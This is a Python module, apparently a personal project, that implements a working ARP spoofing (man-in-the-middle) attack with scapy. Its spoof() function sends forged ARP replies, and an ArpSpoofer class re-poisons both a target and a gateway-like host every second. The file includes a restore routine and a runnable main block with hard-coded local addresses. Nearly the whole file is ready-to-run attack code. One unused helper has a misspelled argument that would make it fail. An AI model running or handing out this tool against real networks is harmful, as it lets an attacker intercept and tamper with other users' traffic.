'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
import threading


def get_mac1(ip: str):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
    return answered_list[0][1].hwsrc


def get_mac(ip: str):
    '''
    return MAC address of any device connected to the network
    If ip is down return None
    '''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
    if answered_list:
        return answered_list[0][1].src


def spoof(target_ip: str, spoof_ip: str, verbose=False):
    '''
    Spoofs 'target_ip' saying that we are host_ip
    '''
    packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    if verbose:
        #get the MAC address of the default interface we are using
        packet.show()
        self_mac = scapy.ARP().hwsrc  
        # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=destination_ip,
            hwdst = destination_mac,
            psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)


class ArpSpoofer:

    def __init__(self, verbose=False, interval=1.0):
        self.verbose = verbose
        self.interval = interval

        self.running = False
        self.timer = None


    def tick(self):
        if not self.running:
            return

        #Telling the target that we are the host
        spoof(self.target_ip, self.host_ip, self.verbose)

        # Telling the host that we are the target
        spoof(self.host_ip, self.target_ip, self.verbose)

        # rerun in a second
        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip='192.168.8.137', host_ip='192.168.8.243', verbose=None):
        if verbose is not None:
            self.verbose = verbose

        if not self.verbose:
            scapy.conf.verb = 0
        
        if self.running:
            print("ARP Spoof is already running")
            return
        
        print("Starting ARP Spoof")

        self.target_ip = target_ip
        self.host_ip = host_ip

        self.running = True

        self.tick()

                
    def stop(self):

        if self.running == False:
            print("ARP spoof is not running")
            return

        print("Stopping ARP spoof...")

        self.running = False

        if self.timer:
            self.timer.cancel()

        restore(self.target_ip, self.host_ip)
        restore(self.host_ip, self.target_ip)

        print("Stopped ARP Spoof")


if __name__ == "__main__":
    spoofer = ArpSpoofer()

    spoofer.start(verbose=True)

    input("Press Enter to stop")

    spoofer.stop()